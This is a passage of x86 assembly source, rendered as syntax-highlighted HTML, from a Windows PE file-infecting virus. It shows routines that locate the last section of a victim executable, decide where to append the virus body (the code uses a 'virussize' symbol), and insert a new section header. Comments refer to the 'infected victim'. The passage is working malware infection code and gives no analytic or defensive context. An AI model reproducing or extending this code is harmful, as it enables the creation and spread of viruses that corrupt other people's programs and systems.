</span><span class="sc5">locate_last_section_stuff</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofoptionalheader</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberofsections</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;get number of sections</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;first calculate the</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lowest_section_raw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;lowest pointer to raw</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">compare_rva</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lowest_section_raw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">next_compare</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lowest_section_raw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">next_compare</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">compare_rva</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      add edx, [ebp+sizeofheaders]                ;useless crap...</span><span class="sc0">
</span><span class="sc1">;      mov [ebp+totalsizes], edx                   ;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;go for last</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;multiply with the size</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;of a section</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;save pointer to header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionrva</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionraw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;choose the smaller of</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;the sizes</span><span class="sc0">


</span><span class="sc1">; Major fix-up!! Many PE files mark in the section header a value which is</span><span class="sc0">
</span><span class="sc1">; much smaller than the real size of the data. The real value gets calculated</span><span class="sc0">
</span><span class="sc1">; somehow by the loader, so if we place at the end of one of the sizes we</span><span class="sc0">
</span><span class="sc1">; will probably overwrite data, so I will simply place it at the end of</span><span class="sc0">
</span><span class="sc1">; the file, even if this means increasing the infected victim.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; if you want to enable the placing in the last section cavity unmark the</span><span class="sc0">
</span><span class="sc1">; following lines:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      call choose_smaller                         ;</span><span class="sc0">
</span><span class="sc1">;      or eax, eax                                 ;if one is zero, try the</span><span class="sc0">
</span><span class="sc1">;      jnz last_size_ok                            ;other; if both are 0...</span><span class="sc0">
</span><span class="sc1">;      xchg eax, ebx                               ;</span><span class="sc0">
</span><span class="sc1">;      or eax, eax                                 ;</span><span class="sc0">
</span><span class="sc1">;      jnz last_size_ok                            ;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">consider_eof</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;...consider the EOF as</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;the last section dest.</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">save_it</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">last_size_ok</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;if the size is ok, then</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;retrieve the pointer to</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;raw data. If it is 0</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">consider_eof</span><span class="sc0">                             </span><span class="sc1">;take eof, otherwise add</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;it to obtain the pos.</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;if it exceedes the file</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">consider_eof</span><span class="sc0">                             </span><span class="sc1">;size also consider EOF.</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">save_it</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_section_destination</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;save last section pointer</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_relocations</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">situation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">RELOCATIONS_LAST</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_last</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">not_relocations</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_DataDirectory.DE_Resource.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_resources</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">situation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">RESOURCES_LAST</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">done_last</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_resources</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">situation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WE_ARE_LAST</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">done_last</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">add_new_section</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;save all</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">123h</span><span class="sc0">                               </span><span class="sc1">;choose some random</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                              </span><span class="sc1">;increasement</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newraw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;save new raw</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_to_filealign</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;save new aligned size</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberofrva</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofoptionalheader</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEEEEEEEh</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">choose_smallest_directory_va</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">go_to_next</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">found_smaller_va</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">go_to_next</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_smaller_va</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">go_to_next</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">choose_smallest_directory_va</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">smallest_dir_va</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionheader</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;go to last section header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">its_not_ok</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;can we insert a new</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;section header?</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lowest_section_raw</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">its_ok</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">its_not_ok</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">its_ok</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;and make a copy of it</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofheaders</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">ok_header_size</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_to_filealign</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofheaders</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ok_header_size</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">situation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WE_ARE_LAST</span><span class="sc0">            </span><span class="sc1">;are we at end?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_last</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lastsectionheader</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;if yes, then we</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;rearrange the last header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_section_destination</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">align_to_filealign</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
